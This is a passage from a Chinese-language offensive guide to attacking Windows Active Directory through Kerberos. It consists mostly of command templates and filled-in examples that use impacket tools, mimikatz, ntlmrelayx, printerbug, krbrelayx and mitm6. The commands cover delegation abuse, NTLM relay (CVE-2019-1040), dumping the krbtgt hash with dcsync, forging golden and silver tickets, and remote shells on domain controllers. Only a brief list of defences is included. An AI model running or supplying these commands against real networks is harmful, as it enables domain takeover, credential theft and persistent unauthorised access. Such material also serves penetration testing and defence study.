proxychains python3 addcomputer.py <域名>/<具备创建机器账号的域用户>:<密码> -method SAMR -computer-name <要创建的机器账号名称> -computer-pass <要创建的机器账号的密码> -dc-ip <主域控服务器IP>
# 示例
proxychains python3 addcomputer.py chatapt.com/addpcadmin:1qaz@WSX -method SAMR -computer-name APT\$ -computer-pass P@ssw0rd -dc-ip 10.10.10.1
```

![rbcd](../../images/AD/Kerberos/rbcd-20.png)

- 开启ntlmrelayx并利用CVE-2019-1040漏洞

```shell
# 模板
proxychains python3 ntlmrelayx.py -t ldap://<域控服务器IP> -smb2support --remove-mic --delegate-access --escalate-user <刚才创建的机器账号>
# 示例
proxychains python3 ntlmrelayx.py -t ldap://10.10.10.2 -smb2support --remove-mic --delegate-access --escalate-user APT\$
```

![rbcd](../../images/AD/Kerberos/rbcd-21.png)

- 使用**printerbug**触发强制认证漏洞

```shell
# 模板
proxychains python3 printerbug.py <域名>/<域用户名>:<密码>@<要提权的服务器IP> <中继IP>
# 示例
proxychains python3 printerbug.py chatapt.com/addpcadmin:1qaz@WSX@10.10.80.1 10.10.255.1
```

![rbcd](../../images/AD/Kerberos/rbcd-22.png)

- 成功获取目标服务器权限

![rbcd](../../images/AD/Kerberos/rbcd-23.png)

- 使用**getST**申请票据

```shell
# 模板
proxychains python3 getST.py <域名>/<刚才创建的机器账号>:<密码> -spn <目标服务器的SPN服务> -impersonate administrator -dc-ip 10.10.10.2
# 示例
proxychains python3 getST.py chatapt.com/APT$:P@ssw0rd -spn cifs/MSSQL.chatapt.com -impersonate administrator -dc-ip 10.10.10.2
```

![rbcd](../../images/AD/Kerberos/rbcd-24.png)

- 远程连接受控服务器

```shell
# 模板
KRB5CCNAME=<票据名称> proxychains python3 wmiexec.py -k <域名>/administrator@<目标机器域名> -no-pass
# 示例
KRB5CCNAME=administrator.ccache proxychains python3 wmiexec.py -k chatapt.com/administrator@MSSQL.chatapt.com -no-pass
```

![rbcd](../../images/AD/Kerberos/rbcd-25.png)

###### 方法四：变种黄金票据 - 权限维持

- 使用**addcomputer**创建**机器账号**

```shell
# 模板
proxychains python3 addcomputer.py <域名>/<具备创建机器账号的域用户>:<密码> -method SAMR -computer-name <要创建的机器账号名称> -computer-pass <要创建的机器账号的密码> -dc-ip <主域控服务器IP>
# 示例
proxychains python3 addcomputer.py chatapt.com/addpcadmin:1qaz@WSX -method SAMR -computer-name PRIV\$ -computer-pass P@ssw0rd -dc-ip 10.10.10.1
```

![rbcd](../../images/AD/Kerberos/rbcd-26.png)

- 设置**krbtgt**委派

```shell
# 模板
powerpick Set-ADUser krbtgt -PrincipalsAllowedToDelegateToAccount <刚才创建的机器账号>
powerpick Get-ADUser krbtgt -Properties PrincipalsAllowedToDelegateToAccount
# 示例
powerpick Set-ADUser krbtgt -PrincipalsAllowedToDelegateToAccount PRIV$
powerpick Get-ADUser krbtgt -Properties PrincipalsAllowedToDelegateToAccount
```

![rbcd](../../images/AD/Kerberos/rbcd-27.png)

- 使用**getST**申请票据并利用**-force-forwardable**参数即**CVE-2020-1704**绕过**敏感用户不能被委派**的安全配置

```shell
# 模板
proxychains python3 getST.py <域名>/<刚才创建的机器账号>:<密码> -spn <目标服务器的SPN服务> -impersonate administrator -dc-ip <域控服务器IP>
# 示例
proxychains python3 getST.py chatapt.com/PRIV$:P@ssw0rd -spn krbtgt -impersonate administrator -dc-ip 10.10.10.1 -force-forwardable
```

![rbcd](../../images/AD/Kerberos/rbcd-30.png)

![rbcd](../../images/AD/Kerberos/rbcd-28.png)

- 远程连接受控服务器

```shell
# 模板
KRB5CCNAME=<票据名称> proxychains python3 wmiexec.py -k <域名>/administrator@<目标机器域名> -no-pass
# 示例
KRB5CCNAME=administrator.ccache proxychains python3 wmiexec.py -k chatapt.com/administrator@DC-MASTER.chatapt.com -no-pass
```

![rbcd](../../images/AD/Kerberos/rbcd-29.png)

#### 防护措施

- 对于高权限用户，设置为**敏感用户，不能被委派**
- 若要设置委派，不设置非约束性委派而是设置约束性委派
- 可以将敏感用户添加至**Protected User**组中，该组用户不允许被委派
- 使用**KB4598347**补丁

## 域用户权限维持

### Gloden Ticket - 黄金票据（TGT）

#### 利用条件

1. **域名称**
2. 域的**SID**值
3. 域的**KRBTGT**账号的**HASH**
4. 伪造**任意用户名**

#### 攻击方式

- 使用**mimikatz**获取**krbtgt**用户的**hash**

```shell
# 模板
mimikatz.exe "lsadump::dcsync /domain:<域名> /user:krbtgt" "exit"
# 示例
mimikatz.exe "lsadump::dcsync /domain:chatapt.com /user:krbtgt" "exit"
```

![golden](../../images/AD/Kerberos/golden-1.png)

- 伪造**administrator**用户的**TGT**

  - 使用**ticketer**伪造

  ```shell
  # 模板
  proxychains python3 ticketer.py -domain-sid <krbtgt所在域的SID> -nthash <ntlm hash> -domain <域名> administrator
  # 示例
  proxychains python3 ticketer.py -domain-sid S-1-5-21-2031906553-2665046962-2085994062 -nthash 17d72baf674fc3571fb362cc7fe03287 -domain chatapt.com administrator
  ```

  ![golden](../../images/AD/Kerberos/golden-4.png)

  - 使用**mimikatz**伪造

  ```shell
  # 模板
  mimikatz.exe "kerberos::golden /user:administrator /domain:<域名> /sid:<krbtgt用户的SID> /krbtgt:<krbtgt用户的hash> /ticket:administrator.kribi" "exit"
  # 示例
  mimikatz.exe "kerberos::golden /user:administrator /domain:chatapt.com /sid:S-1-5-21-2031906553-2665046962-2085994062 /krbtgt:17d72baf674fc3571fb362cc7fe03287 /ticket:administrator.kribi" "exit"
  ```

  ![golden](../../images/AD/Kerberos/golden-2.png)

- 使用黄金票据

  - 方法一：环境变量导入票据并使用exec工具远控

  ```shell
  # 模板
  KRB5CCNAME=<票据名称> proxychains python3 smbexec.py -k <域名>/administrator@<目标机器域名> -no-pass
  # 示例
  KRB5CCNAME=administrator.ccache proxychains python3 smbexec.py -k chatapt.com/administrator@DC-MASTER.chatapt.com -no-pass
  ```

  ![golden](../../images/AD/Kerberos/golden-5.png)

  - 方法二：使用cobalt  strike制作黄金票据并远控域控

    - 选择黄金票据模块

    ![golden](../../images/AD/Kerberos/golden-6.png)

    - 制作黄金票据

    ![golden](../../images/AD/Kerberos/golden-7.png)

  - 方法三：使用**mimikatz**导入黄金票据

  ```shell
  # 模板
  mimikatz.exe "kerberos::ptt <票据文件路径>" "exit"
  # 示例
  mimikatz.exe "kerberos::ptt administrator.kribi" "exit"
  ```

  ![golden](../../images/AD/Kerberos/golden-8.png)

- 尝试访问域控

```shell
# 模板
dir \\<域控服务器名称>\C$
# 示例
dir \\DC-AUXILIARY.chatapt.com\C$
```

![golden](../../images/AD/Kerberos/golden-9.png)

### Silver Ticket - 白银票据（TGS）

#### 利用条件

1. 域名
2. 域SID
3. 目标服务器的FQDN即完整的域名
4. 可利用的服务
5. **服务账户**的NTLM哈希
6. 伪造的用户名即任意用户名

#### 攻击方式

- 使用**mimikatz**获取**SPN**账号的**hash**

```shell
mimikatz.exe "lsadump::lsa /patch"
```

- 使用**mimikatz**伪造administrator用户的TGT

```shell
mimikatz.exe "kerberos::golden /domain:<域名> /sid:<SPN账号的SID> /target:<目标服务器域名> /service:<目标服务> /rc4:<SPN账号的SID> /user:administrator /ptt"
```

## //TODO Kerberos Relay

![](../../images/Kerberos-Relay.jpg)

### 攻击方式

- 使用**certutil**命令获取域内**ADCS**服务器信息

```shell
certutil -dump
```

- 攻击机开启**krbrelayx**监听，获取目标服务器**机器账户**权限

```shell
krbrelayx.exe --target http://<ADCS服务器域名>/certsrv/ -ip <攻击机IP> --victim <受害服务器域名> --adcs --template Machine
```

- 攻击机开启**mitm6**监听

```shell
mitm6.exe --domain <域名> --host-allowlist <受害服务器域名> --relay <ADCS服务器域名>
```

- 等待目标机器进行IPv6记录更新查询，触发查询即可获取**base64证书数据**
- 获取**base64证书数据**后，使用**smbexec**远程执行命令

```shell
KRB5CCNAME=admin.ccache python smbexec.py -k test.com/Administrator@win-test.test.com -no-pass
```

#### CVE-2022-33647（强制认证漏洞）

//TODO

# 鸣谢

[**PowerView**](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)

[**ASREPRoast**](https://github.com/HarmJ0y/ASREPRoast)

[**Rubeus**](https://github.com/GhostPack/Rubeus)

[**GoRottenTomato**](https://github.com/1ight-2020/GoRottenTomato)

[**impacket**](https://github.com/fortra/impacket)

[**hashcat**](https://github.com/hashcat/hashcat)

[**Invoke-Kerberoast**](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1)

[**kerbrute**](https://github.com/ropnop/kerbrute)

[**MS14-068**](https://github.com/Al1ex/WindowsElevation/blob/master/CVE-2014-6324/MS14-068.exe)

[**mimikatz**](https://github.com/gentilkiwi/mimikatz)

[**BloodHound**](https://github.com/BloodHoundAD/BloodHound)

[**kekeo**](https://github.com/gentilkiwi/kekeo)

[**krbrelayx**](https://github.com/dirkjanm/krbrelayx)

[**mitm6**](https://github.com/dirkjanm/mitm6)
